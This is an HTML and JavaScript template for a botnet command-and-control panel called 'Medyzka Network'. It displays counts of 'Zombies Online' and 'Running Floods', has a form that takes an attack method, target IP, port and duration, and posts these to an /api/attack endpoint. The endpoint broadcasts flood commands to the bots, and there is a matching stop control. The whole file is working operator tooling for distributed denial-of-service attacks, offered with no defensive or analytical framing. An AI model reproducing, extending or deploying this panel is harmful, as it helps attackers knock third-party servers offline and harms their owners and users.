<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>C2 Panel | Bots: {{ bots }}</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            glassBorder: 'rgba(255, 255, 255, 0.1)',
            glassBg: 'rgba(20, 20, 20, 0.4)',
          }
        }
      }
    }
  </script>
  <style>
    .bg-wallpaper {
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        z-index: -10;
        background: url('/bg.jpg') no-repeat center center fixed;
        background-size: cover;
        filter: blur(8px);
        transform: scale(1.05);
    }

    .glass-panel {
        background: rgba(15, 15, 15, 0.45);
        backdrop-filter: blur(25px);
        -webkit-backdrop-filter: blur(25px);
        border: 1px solid rgba(255, 255, 255, 0.12);
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
    }

    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 10px; }
    
    .input-glass {
        background: rgba(0, 0, 0, 0.3);
        border: 1px solid rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        color: white;
    }
    .input-glass:focus {
        background: rgba(0, 0, 0, 0.5);
        border-color: rgba(255, 255, 255, 0.4);
        outline: none;
        box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
    }

    select.input-glass option {
        background: rgba(15, 15, 15, 0.95);
        color: white;
        padding: 12px;
    }
  </style>
</head>
<body class="text-white antialiased font-sans min-h-screen flex flex-col overflow-x-hidden">
<div class="bg-wallpaper"></div>

<section class="mt-[60px] lg:mt-[80px] flex-grow">
  <div class="text-center mb-12 relative z-10">
    <h3 class="text-[36px] mb-2 text-white font-bold tracking-tight drop-shadow-md">Medyzka Network</h3>
  </div>

  <div class="px-4 sm:px-6 lg:px-8 mb-20 relative z-10">
    <div class="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8">
      <div class="md:col-span-1 glass-panel rounded-2xl overflow-hidden transition-all duration-300 hover:border-white/20">
        <div class="p-8 flex flex-col h-full justify-between">
          <div>
              <div class="flex items-center space-x-2 mb-6">
                <div class="w-3 h-3 rounded-full bg-red-500"></div>
                <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div class="w-3 h-3 rounded-full bg-green-500"></div>
              </div>
              <h3 class="text-xl font-semibold text-white mb-1">Status</h3>
              <p class="text-gray-400 text-sm mb-8">Network Metrics</p>
              <div class="space-y-6">
                  <div class="flex flex-col p-4 rounded-xl bg-white/5 border border-white/5">
                      <span class="text-gray-400 text-xs uppercase tracking-wider font-semibold">Zombies Online</span>
                      <span class="text-4xl font-bold text-white mt-1 drop-shadow-lg" id="bot-count">{{ bots }}</span>
                  </div>
                  <div class="flex flex-col p-4 rounded-xl bg-white/5 border border-white/5">
                      <span class="text-gray-400 text-xs uppercase tracking-wider font-semibold">Running Floods</span>
                      <span class="text-4xl font-bold text-white mt-1 drop-shadow-lg" id="attack-count">{{ attacks }}</span>
                  </div>
              </div>
          </div>
          <div class="mt-8">
            <button onclick="stopAttack()" class="w-full py-3 px-4 bg-red-500/80 hover:bg-red-500 text-white rounded-xl font-medium transition duration-200 border border-red-400/30 shadow-lg backdrop-blur-md">
                Stop All Actions
            </button>
          </div>
        </div>
      </div>

      <div class="md:col-span-2 glass-panel rounded-2xl overflow-hidden transition-all duration-300 hover:border-white/20">
        <div class="p-8 flex flex-col h-full">
          <h3 class="text-xl font-semibold text-white mb-1">Target Control</h3>
          <p class="text-gray-400 text-sm mb-6">Launch parameters</p>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div class="col-span-2">
                <label class="block text-xs text-gray-300 uppercase mb-2 ml-1 font-bold">Attack Method</label>
                <select id="method" class="w-full input-glass rounded-xl px-4 py-3 appearance-none cursor-pointer focus:ring-2 focus:ring-white/30 focus:border-white/40 transition duration-200">
                    {% for method in methods %}
                    <option value="{{ method }}" class="bg-gray-900 text-white py-2 hover:bg-gray-800">{{ method }}</option>
                    {% endfor %}
                </select>
            </div>
            <div class="col-span-2 md:col-span-1">
                <label class="block text-xs text-gray-300 uppercase mb-2 ml-1 font-bold">Target IP</label>
                <input type="text" id="ip" placeholder="1.1.1.1" class="w-full input-glass rounded-xl px-4 py-3 placeholder-gray-500">
            </div>
            <div>
                <label class="block text-xs text-gray-300 uppercase mb-2 ml-1 font-bold">Port</label>
                <input type="text" id="port" placeholder="80" value="80" class="w-full input-glass rounded-xl px-4 py-3 placeholder-gray-500">
            </div>
            <div class="col-span-2">
                <label class="block text-xs text-gray-300 uppercase mb-2 ml-1 font-bold">Duration (Seconds)</label>
                <input type="text" id="time" placeholder="60" value="60" class="w-full input-glass rounded-xl px-4 py-3 placeholder-gray-500">
            </div>
          </div>
          <button onclick="startAttack()" class="mt-auto w-full py-4 px-6 bg-white/90 hover:bg-white text-black rounded-xl font-bold text-lg transition duration-200 shadow-lg border border-white/50">
            Launch Attack
          </button>
        </div>
      </div>

      <div class="md:col-span-3 glass-panel rounded-2xl overflow-hidden min-h-[200px]">
          <div class="p-6 h-full flex flex-col">
              <h3 class="text-sm font-bold text-gray-300 mb-4 uppercase tracking-wider border-b border-white/10 pb-2 flex items-center gap-2">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                Terminal Output
              </h3>
              <div id="logs" class="flex-grow overflow-y-auto font-mono text-sm space-y-2 text-gray-300 max-h-60 pr-2">
                  <div class="flex items-center space-x-2"><span class="text-green-400">➜</span><span>System initialized. Waiting for input...</span></div>
              </div>
          </div>
      </div>
    </div>
  </div>
</section>

<script>
    function log(msg, isError = false) {
        const logs = document.getElementById('logs');
        const entry = document.createElement('div');
        entry.className = 'flex items-center space-x-2';
        const now = new Date();
        const time = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
        const prefix = isError ? '<span class="text-red-400">✖</span>' : '<span class="text-green-400">➜</span>';
        const colorClass = isError ? 'text-red-300' : 'text-gray-300';
        entry.innerHTML = `${prefix}<span class="opacity-50 text-xs">[${time}]</span> <span class="${colorClass}">${msg}</span>`;
        logs.appendChild(entry);
        logs.scrollTop = logs.scrollHeight;
    }

    function updateStats() {
        fetch('/api/stats')
            .then(res => res.json())
            .then(data => {
                document.getElementById('bot-count').innerText = data.bots;
                document.getElementById('attack-count').innerText = data.attacks;
                document.title = `Medyzka Network | Bots: ${data.bots}`;
            }).catch(e => {});
    }

    function startAttack() {
        const method = document.getElementById('method').value;
        const ip = document.getElementById('ip').value;
        const port = document.getElementById('port').value;
        const time = document.getElementById('time').value;

        if(!ip || !port || !time) {
            log('Error: Fill all fields', true);
            return;
        }

        const btn = document.querySelector('button[onclick="startAttack()"]');
        btn.innerText = "Processing...";
        btn.disabled = true;
        btn.classList.add('opacity-70');

        fetch('/api/attack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ method, ip, port, time })
        })
        .then(res => res.json())
        .then(data => {
            if(data.error) log(data.error, true);
            else log(`Broadcast: ${method} -> ${ip}:${port} (${time}s)`);
        })
        .catch(() => log("Connection error", true))
        .finally(() => {
            btn.innerText = "Launch Attack";
            btn.disabled = false;
            btn.classList.remove('opacity-70');
            updateStats();
        });
    }

    function stopAttack() {
        fetch('/api/stop', { method: 'POST' })
        .then(() => {
            log('Broadcast: STOP command sent.', true);
            updateStats();
        });
    }

    setInterval(updateStats, 2000);
    updateStats();
</script>
</body>
</html>
